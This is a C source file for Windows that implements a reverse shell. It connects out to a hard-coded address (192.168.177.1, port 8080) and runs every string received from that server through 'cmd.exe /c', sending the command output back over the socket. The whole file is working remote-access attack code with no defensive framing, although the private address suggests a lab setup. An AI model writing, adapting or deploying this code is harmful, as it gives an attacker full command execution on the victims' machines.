#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define PORT "8888"
#define BUFFER_SIZE 1024



int cmdCMD(char* cmd, SOCKET clientSocket) {
    // Command to execute
    char command[4096] = "cmd.exe /c "; // Replace with your command
    cmd[strlen(cmd) - 1] = '\0';
    strcat_s(command, cmd);
    char buffer[4096];
    DWORD bytesRead;

    // Initialize structures
    STARTUPINFOA si; // Use STARTUPINFOA for ANSI
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;

    // Set security attributes for the pipe
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create a pipe to capture the output
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        printf("CreatePipe failed.\n");
        return 1;
    }

    // Set up the STARTUPINFO structure to redirect output
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(&pi, sizeof(pi));

    // Execute the command using CreateProcessA (ANSI version)
    if (!CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed.\n");
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return 1;
    }

    // Close the write handle to capture output
    CloseHandle(hWrite);

    // Read the output and print it
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0'; // Null-terminate the buffer
        printf("%s", buffer); // Print to console
        send(clientSocket, buffer, (int)strlen(buffer), 0);
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return 0;
}

int main() {
    // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up the server address and port
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080); // Connect to port 8080
    inet_pton(AF_INET, "192.168.177.1", &serverAddress.sin_addr); // Connect to localhost

    // Connect to server
    iResult = connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress));
    if (iResult == SOCKET_ERROR) {
        printf("Connect failed with error: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    printf("Connected to server!\n");

    // Send data to server
    const char* sendbuf = "Hello, Server!";
    iResult = send(clientSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("Send failed with error: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    printf("Bytes Sent: %d\n", iResult);

    // Receive data from server
    char recvbuf[512];
    int recvbuflen = 512;
    while (TRUE) {
        iResult = recv(clientSocket, recvbuf, recvbuflen, 0);
        if (!strcmp(recvbuf, "exit\n")) {
            break;
        }
        if (iResult > 0) {
            printf("Bytes received: %d\n", iResult);
            printf("Message from server: %s\n", recvbuf);
            cmdCMD(recvbuf, clientSocket);
        }
        else if (iResult == 0) {
            printf("Connection closed\n");
        }
        else {
            printf("Receive failed with error: %d\n", WSAGetLastError());
        }
    }

    // Clean up
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
